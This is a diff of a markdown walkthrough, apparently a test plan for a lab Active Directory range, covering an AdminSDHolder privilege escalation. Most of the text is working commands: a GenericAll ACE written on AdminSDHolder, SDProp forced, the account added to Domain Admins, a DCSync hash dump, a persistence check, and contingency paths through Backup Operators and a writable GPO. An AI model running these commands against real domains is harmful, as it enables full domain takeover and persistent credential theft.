 dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" -action read 2>/dev/null | grep -i svc_itadmin
 ```
 
-### 5.3 — Add GenericAll ACE on AdminSDHolder
+### Phase 5b — Add GenericAll ACE on AdminSDHolder
 
 ```bash
-# Using dacledit (impacket)
 dacledit.py 'cyberange.local/svc_itadmin:1tAdm!nSvc#2025' -dc-ip $DC_IP \
     -target-dn "CN=AdminSDHolder,CN=System,DC=cyberange,DC=local" \
     -action write -ace-type full -principal svc_itadmin
-```
-
-Or bloodyAD:
-
-```bash
+# or
 bloodyAD -d cyberange.local -u svc_itadmin -p '1tAdm!nSvc#2025' --host $DC_IP \
     add genericAll 'CN=AdminSDHolder,CN=System,DC=cyberange,DC=local' svc_itadmin
 ```
 
-### 5.4 — Force SDProp to run (instead of waiting 60 minutes)
-
-From a PowerShell session on DC03 (RDP or WinRM as svc_itadmin, or use admin_backup DA account):
+### Phase 5c — Force SDProp
 
 ```powershell
-# Option A: Invoke SDProp via rootDSE
+# Via evil-winrm as svc_itadmin (or any account with remote management)
 $rootDSE = [ADSI]"LDAP://RootDSE"
 $rootDSE.Put("RunProtectAdminGroupsTask", 1)
 $rootDSE.SetInfo()
 ```
 
-Or from Kali via WinRM (if svc_itadmin has remote management):
+### Phase 5d — Add to Domain Admins and Verify
 
 ```bash
-evil-winrm -i $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025'
-```
+# Wait 1–2 minutes after forcing SDProp
+net rpc group addmem "Domain Admins" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
 
-Then in the evil-winrm shell:
-
-```powershell
-$rootDSE = [ADSI]"LDAP://RootDSE"
-$rootDSE.Put("RunProtectAdminGroupsTask", 1)
-$rootDSE.SetInfo()
-```
-
-### 5.5 — Add svc_itadmin to Domain Admins
-
-Wait 1-2 minutes after forcing SDProp, then:
-
-```bash
-net rpc group addmem "Domain Admins" "svc_itadmin" \
-    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
-```
-
-### 5.6 — Verify Domain Admin
-
-```bash
-nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local
-```
-
-Should show `(Pwn3d!)`.
-
-```bash
-# Check group membership
+nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local           # (Pwn3d!)
 nxc ldap $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local --groups | grep -i "domain admins"
 ```
 
-### 5.7 — DCSync (final proof)
+### Phase 5e — DCSync
 
 ```bash
-impacket-secretsdump 'CYBERANGE/svc_itadmin:1tAdm!nSvc#2025@'$DC_IP
+impacket-secretsdump 'CYBERANGE/svc_itadmin:1tAdm!nSvc#2025@'$DC_IP   # dumps Administrator + krbtgt + all hashes
 ```
 
-Should dump all domain hashes including `Administrator` and `krbtgt`.
-
-### 5.8 — Test persistence (SDProp re-adds ACE)
-
-From DC03 as admin_backup, remove svc_itadmin from Domain Admins:
+### Phase 5f — Persistence Check (SDProp re-adds the ACE)
 
 ```powershell
+# As admin_backup, remove svc_itadmin from Domain Admins, then force SDProp again
 Remove-ADGroupMember -Identity "Domain Admins" -Members "svc_itadmin" -Confirm:$false
+$rootDSE = [ADSI]"LDAP://RootDSE"; $rootDSE.Put("RunProtectAdminGroupsTask", 1); $rootDSE.SetInfo()
+```
+```bash
+# Re-adding still works because the GenericAll ACE was re-propagated
+net rpc group addmem "Domain Admins" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
 ```
 
-Force SDProp again:
-
-```powershell
-$rootDSE = [ADSI]"LDAP://RootDSE"
-$rootDSE.Put("RunProtectAdminGroupsTask", 1)
-$rootDSE.SetInfo()
-```
-
-Wait 1-2 minutes, then from Kali try adding self back:
+### Contingency C5a — Backup Operators
 
 ```bash
-net rpc group addmem "Domain Admins" "svc_itadmin" \
-    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
-```
-
-Should work because the GenericAll ACE on AdminSDHolder got re-propagated by SDProp.
-
----
-
-## TEST CONTINGENCY C5a: Backup Operators
-
-```bash
-# Add svc_itadmin to Backup Operators
-net rpc group addmem "Backup Operators" "svc_itadmin" \
-    -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
-
-# Verify
+net rpc group addmem "Backup Operators" "svc_itadmin" -U "CYBERANGE/svc_itadmin%1tAdm!nSvc#2025" -S $DC_IP
 nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "whoami /groups" | grep -i backup
 ```
 
-## TEST CONTINGENCY C5b: Writable GPO
+### Contingency C5b — Writable GPO
 
 ```bash
-# Check if svc_itadmin can edit the GPO
-# Use Get-GPO from a PowerShell session or:
 nxc smb $DC_IP -u svc_itadmin -p '1tAdm!nSvc#2025' -d cyberange.local -x "powershell -c \"Get-GPO -Name DC-HealthCheck-Policy\""
 ```
 
-## SUMMARY: What Each Step Proves
+> **Step 5 Result:** Full domain compromise. `svc_itadmin` added to Domain Admins via AdminSDHolder; DCSync of `cyberange.local` recovers all hashes including `Administrator` and `krbtgt`. Access is self-healing through SDProp.
 
-|Step|What You're Testing|Success Criteria|
+---
+
+## Summary: What Each Step Proves
+
+| Step | Technique Tested | Success Criteria |
 |---|---|---|
-|0|Network visibility|All 5 hosts found, ports identified|
-|1|LDAP passback|svc_ldap creds captured in cleartext|
-|C1a|web.config.bak leak|Password visible via HTTP|
-|C1b|docs page leak|Password visible via HTTP|
-|C1c|Hidden share leak|Password in SMB share files|
-|SKIP-A|ForceChangePassword ACL|svc_build password reset succeeds|
-|2|SQL IMPERSONATE + Agent|xp_cmdshell as svc_dev works|
-|C2a|TRUSTWORTHY chain|EXECUTE AS dbo → xp_cmdshell works|
-|C2c|CLR assembly|sp_clr_exec returns whoami|
-|SKIP-B|Cred table|svc_itadmin password in SELECT results|
-|3|Service binPath hijack|Shell as svc_build received|
-|C3a|Unquoted path|wmic shows unquoted, icacls shows writable|
-|C3b|Writable sched task|Task folder writable by Authenticated Users|
-|C3c|AlwaysInstallElevated|Both registry keys = 1|
-|4|LAPS read + DPAPI|LAPS password works, svc_itadmin creds extracted|
-|C4a|AutoLogon registry|CorpAdmin password in registry|
-|C4b|PSReadline history|svc_itadmin password in history file|
-|C4c|Unattend.xml|Encoded password decodable|
-|5|AdminSDHolder → DA|DCSync succeeds as svc_itadmin|
-|C5a|Backup Operators|Group membership added successfully|
-|C5b|Writable GPO|GPO editable by svc_itadmin|
+| 0 | Network visibility | All 5 hosts found, ports identified |
+| 1 | LDAP passback | `svc_ldap` captured in cleartext (plus C1a/C1b/C1c, Skip-A) |
+| 2 | SQL IMPERSONATE + Agent | `xp_cmdshell` as `svc_dev` (plus Skip-B, C2a, C2c) |
+| 3 | Service binPath hijack | Shell as `svc_build`; LAPS read (plus C3a/C3b/C3c) |
+| 4 | LAPS + DPAPI | LAPS password works; `svc_itadmin` extracted (plus C4a/C4b/C4c) |
+| 5 | AdminSDHolder → DA | DCSync succeeds as `svc_itadmin`; persistence confirmed (plus C5a/C5b) |
